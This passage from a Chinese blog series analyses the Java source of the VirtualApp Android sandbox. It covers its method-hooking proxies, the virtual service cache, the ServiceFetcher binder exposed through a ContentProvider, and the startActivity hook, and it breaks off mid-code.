<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public boolean beforeCall(Object who, Method method, Object... args) &#123;</span><br><span class="line">        return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public Object call(Object who, Method method, Object... args) throws Throwable &#123;</span><br><span class="line">    return method.invoke(who, args);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public Object afterCall(Object who, Method method, Object[] args, Object result) throws Throwable &#123;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以 <code>hook getServices</code> 为例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static class GetServices extends MethodProxy &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public String getMethodName() &#123;</span><br><span class="line">        return &quot;getServices&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Object call(Object who, Method method, Object... args) throws Throwable &#123;</span><br><span class="line">        int maxNum = (int) args[0];</span><br><span class="line">        int flags = (int) args[1];</span><br><span class="line">        return VActivityManager.get().getServices(maxNum, flags).getList();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public boolean isEnable() &#123;</span><br><span class="line">        return isAppProcess();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>getMethodName</code> 是要 <code>Hook</code> 的方法名 </li>
<li><code>Hook getServices</code> 之后发现，真正返回服务的方法变成了仿造的 <code>VActivityManager</code> 对象。而在后面我们会知道这些服务最后都会从 <code>VAMS</code> 中获取，而不是原来的 <code>AMS</code> 。</li>
<li>实现了 <code>isEnable</code> 方法，这是 <code>Hook</code> 开关，如果返回 <code>false</code> 则不 <code>Hook</code> 该方法，而在这里的条件是，只有在子程序环境中 <code>Hook</code> ，而宿主即框架是不需要 <code>Hook</code> 的，框架仍然需要连接真正的 <code>AMS</code> 以获取在系统 <code>AMS</code> 中注册的“外部” <code>service</code> 。</li>
</ul>
<p>那么上面这个 <code>call</code> 在哪里被调用呢？ </p>
<p><strong><code>MethodInvocationStub</code></strong> ，这个桩对应一个需要 <code>Hook</code> 的类，各种 <code>Method</code> 可以在内部添加。</p>
<p>我们需要专注这个方法 <code>addMethodProxy</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line">* Add a method proxy.</span><br><span class="line">*</span><br><span class="line">* @param methodProxy proxy</span><br><span class="line">*/</span><br><span class="line">public MethodProxy addMethodProxy(MethodProxy methodProxy) &#123;</span><br><span class="line">    if (methodProxy != null &amp;&amp; !TextUtils.isEmpty(methodProxy.getMethodName())) &#123;</span><br><span class="line">        if (mInternalMethodProxies.containsKey(methodProxy.getMethodName())) &#123;</span><br><span class="line">            VLog.w(TAG, &quot;The Hook(%s, %s) you added has been in existence.&quot;, methodProxy.getMethodName(),</span><br><span class="line">                    methodProxy.getClass().getName());</span><br><span class="line">            return methodProxy;</span><br><span class="line">        &#125;</span><br><span class="line">        mInternalMethodProxies.put(methodProxy.getMethodName(), methodProxy);</span><br><span class="line">    &#125;</span><br><span class="line">    return methodProxy;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个也是关于动态代理的知识，这里的区别其实就是 <code>Lody</code> 对他做了一些接口的抽象，和一些诸如 <code>Log</code> 的封装。</p>
<p>添加 <code>Hook Method</code> 的方式有两个：</p>
<ul>
<li>一是调用 <code>addMethodProxy</code> ，</li>
<li>二是在 <code>Stub</code> 上添加 <code>@Inject</code> 注解。</li>
</ul>
<p>具体见下一段。</p>
<h3 id="MethodProxies"><a href="#MethodProxies" class="headerlink" title="MethodProxies"></a>MethodProxies</h3><p>叫这个名字的类很多，每一个 <code>MethodProxies</code> 对应一个需要 <code>Hook</code> 的 <code>framework</code> 类型，需要 <code>Hook</code> 的方法以内部类(MethodProxy)的形式罗列在内部。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Inject(MethodProxies.class)</span><br><span class="line">public class LibCoreStub extends MethodInvocationProxy&lt;MethodInvocationStub&lt;Object&gt;&gt; &#123;</span><br></pre></td></tr></table></figure>
<p>将要 <code>Hook</code> 的方法集合 <code>MethodProxies</code> 绑定到 <code>Stub</code> 上。然后就是 <code>Stub</code> 对自己头上注解的解析，最终还是会调用到内部的 <code>addMethodProxy</code> 方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">protected void onBindMethods() &#123;</span><br><span class="line"></span><br><span class="line">    if (mInvocationStub == null) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    Class&lt;? extends MethodInvocationProxy&gt; clazz = getClass();</span><br><span class="line">    Inject inject = clazz.getAnnotation(Inject.class);</span><br><span class="line">    if (inject != null) &#123;</span><br><span class="line">        Class&lt;?&gt; proxiesClass = inject.value();</span><br><span class="line">        Class&lt;?&gt;[] innerClasses = proxiesClass.getDeclaredClasses();</span><br><span class="line">        // 遍历内部类</span><br><span class="line">        for (Class&lt;?&gt; innerClass : innerClasses) &#123;</span><br><span class="line">            if (!Modifier.isAbstract(innerClass.getModifiers())</span><br><span class="line">                    &amp;&amp; MethodProxy.class.isAssignableFrom(innerClass)</span><br><span class="line">                    &amp;&amp; innerClass.getAnnotation(SkipInject.class) == null) &#123;</span><br><span class="line">                addMethodProxy(innerClass);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h1 id="运行时结构"><a href="#运行时结构" class="headerlink" title="运行时结构"></a>运行时结构</h1><p>这点很重要， <code>VA</code> 在运行时并不是一个简单的单进程的库，其需要在系统调用到其预先注册的 <code>Stub</code> 组件之后接手系统代理 <code>Client App</code> 的 四大组件，包括生命周期等一切事物。</p>
<p><code>VA</code> 参照原生系统 <code>framework</code> 仿造了一套 <code>framework service</code>，还有配套在 <code>client</code> 端的 <code>framework</code> 库。</p>
<h2 id="系统原生的-framework-运作方式"><a href="#系统原生的-framework-运作方式" class="headerlink" title="系统原生的 framework 运作方式"></a>系统原生的 framework 运作方式</h2><p>简单来说，我们平时所用到的 <code>app</code> 运行空间中的 <code>framework api</code> 最终会通过 <code>Binder</code> 远程调用到 <code>framework service</code> 空间的远程服务。</p>
<p>而远程服务类似 <code>AMS</code> 中的 <code>Recoder</code> 中会持有 <code>app</code> 空间的 <code>Ibinder token</code> 句柄，通过 <code>token</code> 也可以让 <code>framework service</code> 远程调用到 <code>app</code> 空间。</p>
<img src="/2020/08/03/Android-%E5%8F%8C%E5%BC%80%E6%B2%99%E7%AE%B1-VirtualApp-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89/2020-08-03-20-12-02.png" class="">


<h2 id="VA-环境下-framework-运作方式"><a href="#VA-环境下-framework-运作方式" class="headerlink" title="VA 环境下 framework 运作方式"></a>VA 环境下 framework 运作方式</h2><p>而在 <code>VA</code> 环境下，情况其实也是类似，只不过在 <code>framework service</code> 和 <code>client app</code> 之间还有另外一个 <code>VA</code> 实现的 <code>VAService</code> ， <code>VAService</code> 仿造了 <code>framework service</code> 的一些功能。</p>
<p>因为在 <code>VA</code> 中运行的 <code>Client App</code> 都是没有(也不能注册)在 <code>framework service </code>的，注册的只有 <code>VA</code> 预先注册在 <code>Menifest</code> 中的 <code>Stub</code> 而已。所以 <code>frameservice</code> 是无法像普通 <code>App</code> 一样管理 <code>VA Client App</code> 的会话的。</p>
<p>这就要依靠 <code>VA</code> 仿造的另外一套 <code>VAService</code> 完成对 <code>VA</code> 中 <code>Client App</code> 的会话管理了。</p>
<img src="/2020/08/03/Android-%E5%8F%8C%E5%BC%80%E6%B2%99%E7%AE%B1-VirtualApp-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89/2020-08-03-20-48-38.png" class="">

<p>需要注意的是 <code>VA Client</code> 获取 <code>VA Service</code> 的 <code>IBinder</code> 句柄是统一通过 <code>IServiceFetcher</code> 这个句柄，这个看上去有些奇怪。而获得 <code>IServiceFetcher</code> 本身的方式是通过 <code>ContentProvider</code> ，选择 <code>ContentProvider</code> 原因是 <code>ContentProvider</code> 是同步的，如果使用 <code>Servicec</code> ，<code>Service</code> 的连接是异步的。</p>
<blockquote>
<p>使用contentprovider比service实现同步轻松得多。前不久我还在想怎么同步调用service中的方法，最终选择了aidl。但是aidl需要绑定服务才能使用，而使用contentprovider调用同app不同进程的方法一个字符串就可以了，也不要求进程必须在。</p>
</blockquote>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>VirtualApp</tag>
      </tags>
  </entry>
  <entry>
    <title>Android 双开沙箱 VirtualApp 源码分析（三）App 启动</title>
    <url>/2020/08/08/Android-%E5%8F%8C%E5%BC%80%E6%B2%99%E7%AE%B1-VirtualApp-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%89%EF%BC%89App-%E5%90%AF%E5%8A%A8/</url>
    <content><![CDATA[<blockquote>
<p>转载 : <a href="https://blog.csdn.net/ganyao939543405/article/details/76177392">https://blog.csdn.net/ganyao939543405/article/details/76177392</a></p>
</blockquote>
<p>在这之前，我们还是要先了解一下 VA Client Framework 和 VAService 之间的通讯方式</p>
<h1 id="VAService-与通讯"><a href="#VAService-与通讯" class="headerlink" title="VAService 与通讯"></a>VAService 与通讯</h1><h2 id="VAService"><a href="#VAService" class="headerlink" title="VAService"></a>VAService</h2><p>首先 <code>VAService</code> 是指 <code>VA</code> 仿造 <code>Android</code> 原生 <code>framework</code> 层 <code>Service</code> 实现的一套副本，举例有 <code>VActivityManagerService</code> ，它和系统 <code>AMS</code> 一样，只不过他管理的是 <code>VA</code> 内部 <code>Client App</code> 的组件会话。</p>
<img src="/2020/08/08/Android-%E5%8F%8C%E5%BC%80%E6%B2%99%E7%AE%B1-VirtualApp-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%89%EF%BC%89App-%E5%90%AF%E5%8A%A8/2020-08-08-17-25-02.png" class="">

<h1 id="VAService-统一管理"><a href="#VAService-统一管理" class="headerlink" title="VAService 统一管理"></a>VAService 统一管理</h1><p>首先所有 <code>VAService</code> 直接继承与 <code>XXX.Stub</code>，也就是 <code>Binder</code> ，并且直接使用了一个 <code>Map</code> 储存在 <code>VAService</code> 进程空间中，并没有注册到系统 <code>AMS</code> 中，事实上在 <code>VAService</code> 进程中，每个 <code>Service</code> 都被当作一个普通对象 <code>new</code> 和初始化。</p>
<p>最终，他们被添加到了 <code>ServiceCache</code> 中:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class ServiceCache &#123;</span><br><span class="line"></span><br><span class="line">	private static final Map&lt;String, IBinder&gt; sCache = new ArrayMap&lt;&gt;(5);</span><br><span class="line"></span><br><span class="line">	public static void addService(String name, IBinder service) &#123;</span><br><span class="line">		sCache.put(name, service);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public static IBinder removeService(String name) &#123;</span><br><span class="line">		return sCache.remove(name);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public static IBinder getService(String name) &#123;</span><br><span class="line">		return sCache.get(name);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个 <code>cache</code> 很简单，就是一个 <code>Map</code> 。</p>
<p>而被添加的时机则在 <code>BinderProvider</code> 的 <code>onCreate()</code> 回调中:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Override</span><br><span class="line">public boolean onCreate() &#123;</span><br><span class="line">    Context context = getContext();</span><br><span class="line">    // 这是一个空前台服务，目的是为了保活 VAService 进程，即 :x 进程</span><br><span class="line">    DaemonService.startup(context);</span><br><span class="line">    if (!VirtualCore.get().isStartup()) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    VPackageManagerService.systemReady();</span><br><span class="line">    addService(ServiceManagerNative.PACKAGE, VPackageManagerService.get());</span><br><span class="line">    VActivityManagerService.systemReady(context);</span><br><span class="line">    addService(ServiceManagerNative.ACTIVITY, VActivityManagerService.get());</span><br><span class="line">    addService(ServiceManagerNative.USER, VUserManagerService.get());</span><br><span class="line">    VAppManagerService.systemReady();</span><br><span class="line">    addService(ServiceManagerNative.APP, VAppManagerService.get());</span><br><span class="line">    BroadcastSystem.attach(VActivityManagerService.get(), VAppManagerService.get());</span><br><span class="line">    if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.LOLLIPOP) &#123;</span><br><span class="line">        addService(ServiceManagerNative.JOB, VJobSchedulerService.get());</span><br><span class="line">    &#125;</span><br><span class="line">    VNotificationManagerService.systemReady(context);</span><br><span class="line">    addService(ServiceManagerNative.NOTIFICATION, VNotificationManagerService.get());</span><br><span class="line">    VAppManagerService.get().scanApps();</span><br><span class="line">    VAccountManagerService.systemReady();</span><br><span class="line">    addService(ServiceManagerNative.ACCOUNT, VAccountManagerService.get());</span><br><span class="line">    addService(ServiceManagerNative.VS, VirtualStorageService.get());</span><br><span class="line">    addService(ServiceManagerNative.DEVICE, VDeviceManagerService.get());</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要注意的是 <code>DeamonService</code> 是一个空前台服务，目的是为了保活 <code>VAService</code> 进程，即 <code>:x</code> 进程，因为现在后台服务很容易被杀，在 Android 8.0 以后后台服务只能在后台存活 <code>5S</code> ，而前台服务则不受影响。</p>
<h2 id="ServiceFetcher"><a href="#ServiceFetcher" class="headerlink" title="ServiceFetcher"></a>ServiceFetcher</h2><p><code>VA</code> 设计了一个单独的 <code>ServiceFetcher</code> 服务用于向外部暴露 <code>VAService</code> 中的所有服务的 <code>IBinder</code> 句柄，而 <code>ServiceFetcher</code> 本身也是 <code>Binder</code> 服务，也就是说， <code>ServiceFetcher</code> 的 <code>Ibinder</code> 句柄是拿到其他 <code>VAService IBinder</code> 的钥匙。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// ServiceFetcher 实现类 远程调用类</span><br><span class="line">private class ServiceFetcher extends IServiceFetcher.Stub &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public IBinder getService(String name) throws RemoteException &#123;</span><br><span class="line">        if (name != null) &#123;</span><br><span class="line">            return ServiceCache.getService(name);</span><br><span class="line">        &#125;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void addService(String name, IBinder service) throws RemoteException &#123;</span><br><span class="line">        if (name != null &amp;&amp; service != null) &#123;</span><br><span class="line">            ServiceCache.addService(name, service);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void removeService(String name) throws RemoteException &#123;</span><br><span class="line">        if (name != null) &#123;</span><br><span class="line">            ServiceCache.removeService(name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ServicecFetcher</code> 自身的 <code>IBnder</code> 则通过 <code>BinderProvicer</code> <code>这个ContentProvider</code> 暴露给其他进程:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Override</span><br><span class="line">public Bundle call(String method, String arg, Bundle extras) &#123;</span><br><span class="line">    if (&quot;@&quot;.equals(method)) &#123;</span><br><span class="line">        Bundle bundle = new Bundle();</span><br><span class="line">        BundleCompat.putBinder(bundle, &quot;_VA_|_binder_&quot;, mServiceFetcher);</span><br><span class="line">        return bundle;</span><br><span class="line">    &#125;</span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么在 <code>Client App</code> 中<code> VA Client</code> 就可以通过 <code>IServiceFetcher</code> 这个 <code>IBinder</code> 拿到其他服务的 <code>IBinder</code> 了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 通过 ContentProvider 传递一个</span><br><span class="line">private static IServiceFetcher sFetcher;</span><br><span class="line"></span><br><span class="line">private static IServiceFetcher getServiceFetcher() &#123;</span><br><span class="line">    if (sFetcher == null || !sFetcher.asBinder().isBinderAlive()) &#123;</span><br><span class="line">        synchronized (ServiceManagerNative.class) &#123;</span><br><span class="line">            Context context = VirtualCore.get().getContext();</span><br><span class="line">            Bundle response = new ProviderCall.Builder(context, SERVICE_CP_AUTH).methodName(&quot;@&quot;).call();</span><br><span class="line">            /* SERVICE_CP_AUTH 对应着下面的 Provider</span><br><span class="line">                &lt;provider</span><br><span class="line">                    android:name=&quot;com.lody.virtual.server.BinderProvider&quot;</span><br><span class="line">                    android:authorities=&quot;$&#123;applicationId&#125;.virtual.service.BinderProvider&quot;</span><br><span class="line">                    android:exported=&quot;false&quot;</span><br><span class="line">                    android:process=&quot;@string/engine_process_name&quot; /&gt;</span><br><span class="line">            */</span><br><span class="line">            if (response != null) &#123;</span><br><span class="line">                IBinder binder = BundleCompat.getBinder(response, &quot;_VA_|_binder_&quot;);</span><br><span class="line">                linkBinderDied(binder);</span><br><span class="line">                sFetcher = IServiceFetcher.Stub.asInterface(binder);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return sFetcher;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 返回服务的 IBinder 句柄</span><br><span class="line">public static IBinder getService(String name) &#123;</span><br><span class="line">    // 如果是本地服务，直接本地返回</span><br><span class="line">    if (VirtualCore.get().isServerProcess()) &#123;</span><br><span class="line">        return ServiceCache.getService(name);</span><br><span class="line">    &#125;</span><br><span class="line">    // 通过 ServiceFetcher 的句柄找到远程 Service 的句柄</span><br><span class="line">    IServiceFetcher fetcher = getServiceFetcher();</span><br><span class="line">    if (fetcher != null) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            return fetcher.getService(name);</span><br><span class="line">        &#125; catch (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    VLog.e(TAG, &quot;GetService(%s) return null.&quot;, name);</span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="启动-App"><a href="#启动-App" class="headerlink" title="启动 App"></a>启动 App</h1><p>首先要了解的是 <code>Android App</code> 是组件化的， <code>Apk</code> 其实是 N 多个组件的集合，以及一些资源文件和 <code>Assert</code> ， <code>App</code> 的启动有多种情况，只要在一个新的进程中调起了 <code>apk</code> 中任何一个组件， <code>App</code> 将被初始化， <code>Application</code> 将被初始化。</p>
<h2 id="启动-Activity"><a href="#启动-Activity" class="headerlink" title="启动 Activity"></a>启动 Activity</h2><p>我们先看启动 <code>Activity</code> 的情况:</p>
<h3 id="Hook-startActivity-重定位-Intent-到-StubActivity"><a href="#Hook-startActivity-重定位-Intent-到-StubActivity" class="headerlink" title="Hook startActivity(重定位 Intent 到 StubActivity)"></a>Hook startActivity(重定位 Intent 到 StubActivity)</h3><p>首先在 <code>Client App</code> 中， <code>startActivity</code> 方法必须被 <code>Hook</code> 掉，不然 <code>Client App</code> 调用 <code>startActivity</code> 就直指外部 <code>Activity</code> 去了。</p>
<p>这部分的原理其实与 <code>DroidPlugin</code> 大同小异，由于插件(<code>Client App</code>)中的 <code>Activity</code> 是没有在 <code>AMS</code> 中注册的， <code>AMS</code> 自然无法找到我们的插件 <code>Activity</code> 。</p>
<p><code>Hook</code> 的目的是我们拿到用户的 <code>Intent</code> ，把他替换成指向 <code>VA</code> 在 <code>Menifest</code> 中站好坑的 <code>StubActivity</code> 的 <code>Intent</code> ，然后将原 <code>Intent</code> 当作 <code>data</code> 打包进新 <code>Intent</code> 以便日后流程再次进入 <code>VA</code> 时恢复。</p>
<p><code>Hook</code> 的方法就是用我们动态代理生成的代理类对象替换系统原来的 <code>ActiityManagerNative.geDefault</code> 对象。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//ActivityManagerStub.java</span><br><span class="line">@Override</span><br><span class="line">public void inject() throws Throwable &#123;</span><br><span class="line">    if (BuildCompat.isOreo()) &#123;</span><br><span class="line">        //Android Oreo(8.X)</span><br><span class="line">        Object singleton = ActivityManagerOreo.IActivityManagerSingleton.get();</span><br><span class="line">        Singleton.mInstance.set(singleton, getInvocationStub().getProxyInterface());</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        if (ActivityManagerNative.gDefault.type() == IActivityManager.TYPE) &#123;</span><br><span class="line">            ActivityManagerNative.gDefault.set(getInvocationStub().getProxyInterface());</span><br><span class="line">        &#125; else if (ActivityManagerNative.gDefault.type() == Singleton.TYPE) &#123;</span><br><span class="line">            Object gDefault = ActivityManagerNative.gDefault.get();</span><br><span class="line">            Singleton.mInstance.set(gDefault, getInvocationStub().getProxyInterface());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    BinderInvocationStub hookAMBinder = new BinderInvocationStub(getInvocationStub().getBaseInterface());</span><br><span class="line">    hookAMBinder.copyMethodProxies(getInvocationStub());</span><br><span class="line">    ServiceManager.sCache.get().put(Context.ACTIVITY_SERVICE, hookAMBinder);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>好了，下面只要调用到 <code>startActivity</code> 就会被 <code>Hook</code> 到 <code>call</code> 。</p>
<p>这个函数需要注意以下几点：</p>
<ol>
<li><code>VA</code> 有意将安装和卸载 <code>APP</code> 的请求重定向到了卸载 <code>VA</code> 内部 <code>APK</code> 的逻辑。</li>
<li><code>resolveActivityInfo</code> 调用到了 <code>VPM</code> 的 <code>resolveIntent</code> ，最终会远程调用到 <code>VPMS</code> 的 <code>resolveIntent</code> ，然后 <code>VPMS</code> 就会去查询 <code>VPackage</code> 找到目标 <code>Activity</code> 并将信息附加在 <code>ResolveInfo</code> 中返回 <code>VPM</code> 。</li>
<li>最后也是最重要的一点， <code>startActivity</code> 会调用到<code> VAM.startActivity</code> ，同样最终会远程调用到 <code>VAMS</code> 的 <code>startActivity</code> 。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Hook startActivity</span><br><span class="line">static class StartActivity extends MethodProxy &#123;</span><br><span class="line"></span><br><span class="line">    private static final String SCHEME_FILE = &quot;file&quot;;</span><br><span class="line">    private static final String SCHEME_PACKAGE = &quot;package&quot;;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getMethodName() &#123;</span><br><span class="line">        return &quot;startActivity&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Object call(Object who, Method method, Object... args) throws Throwable &#123;</span><br><span class="line">        int intentIndex = ArrayUtils.indexOfObject(args, Intent.class, 1);</span><br><span class="line">        if (intentIndex &lt; 0) &#123;</span><br><span class="line">            return ActivityManagerCompat.START_INTENT_NOT_RESOLVED;</span><br><span class="line">        &#125;</span><br><span class="line">        int resultToIndex = ArrayUtils.indexOfObject(args, IBinder.class, 2);</span><br><span class="line">        String resolvedType = (String) args[intentIndex + 1];</span><br><span class="line">        Intent intent = (Intent) args[intentIndex];</span><br><span class="line">        intent.setDataAndType(intent.getData(), resolvedType);</span><br><span class="line">        IBinder resultTo = resultToIndex &gt;= 0 ? (IBinder) args[resultToIndex] : null;</span><br><span class="line">        int userId = VUserHandle.myUserId();</span><br><span class="line"></span><br><span class="line">        if (ComponentUtils.isStubComponent(intent)) &#123;</span><br><span class="line">            return method.invoke(who, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 请求安装和卸载界面</span><br><span class="line">        if (Intent.ACTION_INSTALL_PACKAGE.equals(intent.getAction())</span><br><span class="line">                || (Intent.ACTION_VIEW.equals(intent.getAction())</span><br><span class="line">                &amp;&amp; &quot;application/vnd.android.package-archive&quot;.equals(intent.getType()))) &#123;</span><br><span class="line">            if (handleInstallRequest(intent)) &#123;</span><br><span class="line">                return 0;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else if ((Intent.ACTION_UNINSTALL_PACKAGE.equals(intent.getAction())</span><br><span class="line">                || Intent.ACTION_DELETE.equals(intent.getAction()))</span><br><span class="line">                &amp;&amp; &quot;package&quot;.equals(intent.getScheme())) &#123;</span><br><span class="line"></span><br><span class="line">            if (handleUninstallRequest(intent)) &#123;</span><br><span class="line">                return 0;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String resultWho = null;</span><br><span class="line">        int requestCode = 0;</span><br><span class="line">        Bundle options = ArrayUtils.getFirst(args, Bundle.class);</span><br><span class="line">        if (resultTo != null) &#123;</span><br><span class="line">            resultWho = (String) args[resultToIndex + 1];</span><br><span class="line">            requestCode = (int) args[resultToIndex + 2];</span><br><span class="line">        &#125;</span><br><span class="line">        // chooser 调用选择界面</span><br><span class="line">        if (ChooserActivity.check(intent)) &#123;</span><br><span class="line">            intent.setComponent(new ComponentName(getHostContext(), ChooserActivity.class));</span><br><span class="line">            intent.putExtra(Constants.EXTRA_USER_HANDLE, userId);</span><br><span class="line">            intent.putExtra(ChooserActivity.EXTRA_DATA, options);</span><br><span class="line">            intent.putExtra(ChooserActivity.EXTRA_WHO, resultWho);</span><br><span class="line">            intent.putExtra(ChooserActivity.EXTRA_REQUEST_CODE, requestCode);</span><br><span class="line">            return method.invoke(who, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.JELLY_BEAN_MR2) &#123;</span><br><span class="line">            args[intentIndex - 1] = getHostPkg();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //解析 ActivityInfo</span><br><span class="line">        ActivityInfo activityInfo = VirtualCore.get().resolveActivityInfo(intent, userId);</span><br><span class="line">        if (activityInfo == null) &#123;</span><br><span class="line">            VLog.e(&quot;VActivityManager&quot;, &quot;Unable to resolve activityInfo : &quot; + intent);</span><br><span class="line">            if (intent.getPackage() != null &amp;&amp; isAppPkg(intent.getPackage())) &#123;</span><br><span class="line">                return ActivityManagerCompat.START_INTENT_NOT_RESOLVED;</span><br><span class="line">            &#125;</span><br><span class="line">            return method.invoke(who, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 调用远程 VAMS.startActivity</span><br><span class="line">        int res = VActivityManager.get().startActivity(intent, activityInfo, resultTo, options, resultWho, requestCode, VUserHandle.myUserId());</span><br><span class="line">        if (res != 0 &amp;&amp; resultTo != null &amp;&amp; requestCode &gt; 0) &#123;</span><br><span class="line">            VActivityManager.get().sendActivityResult(resultTo, resultWho, requestCode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 处理 Activity 切换动画，因为此时动画还是 Host 的 Stub Activity 默认动画，需要覆盖成子程序包的动画</span><br><span class="line">        if (resultTo != null) &#123;</span><br><span class="line">            ActivityClientRecord r = VActivityManager.get().getActivityRecord(resultTo);</span><br><span class="line">            if (r != null &amp;&amp; r.activity != null) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    TypedValue out = new TypedValue();</span><br><span class="line">                    Resources.Theme theme = r.activity.getResources().newTheme();</span><br><span class="line">                    theme.applyStyle(activityInfo.getThemeResource(), true);</span><br><span class="line">                    if (theme.resolveAttribute(android.R.attr.windowAnimationStyle, out, true)) &#123;</span><br><span class="line"></span><br><span class="line">                        TypedArray array = theme.obtainStyledAttributes(out.data,</span><br><span class="line">                                new int[]&#123;</span><br><span class="line">                                        android.R.attr.activityOpenEnterAnimation,</span><br><span class="line">                                        android.R.attr.activityOpenExitAnimation</span><br><span class="line">                                &#125;);</span><br><span class="line"></span><br><span class="line">                        r.activity.overridePendingTransition(array.getResourceId(0, 0), array.getResourceId(1, 0));</span><br><span class="line">                        array.recycle();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; catch (Throwable e) &#123;</span><br><span class="line">                    // Ignore</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    private boolean handleInstallRequest(Intent intent) &#123;</span><br><span class="line">        IAppRequestListener listener = VirtualCore.get().getAppRequestListener();</span><br><span class="line">        if (listener != null) &#123;</span><br><span class="line">            Uri packageUri = intent.getData();</span><br><span class="line">            if (SCHEME_FILE.equals(packageUri.getScheme())) &#123;</span><br><span class="line">                File sourceFile = new File(packageUri.getPath());</span><br><span class="line">                try &#123;</span><br><span class="line">                    listener.onRequestInstall(sourceFile.getPath());</span><br><span class="line">                    return true;</span><br><span class="line">                &#125; catch (RemoteException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private boolean handleUninstallRequest(Intent intent) &#123;</span><br><span class="line">        IAppRequestListener listener = VirtualCore.get().getAppRequestListener();</span><br><span class="line">        if (listener != null) &#123;</span><br><span class="line">            Uri packageUri = intent.getData();</span><br><span class="line">            if (SCHEME_PACKAGE.equals(packageUri.getScheme())) &#123;</span><br><span class="line">                String pkg = packageUri.getSchemeSpecificPart();</span><br><span class="line">                try &#123;</span><br><span class="line">                    listener.onRequestUninstall(pkg);</span><br><span class="line">                    return true;</span><br><span class="line">                &#125; catch (RemoteException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span 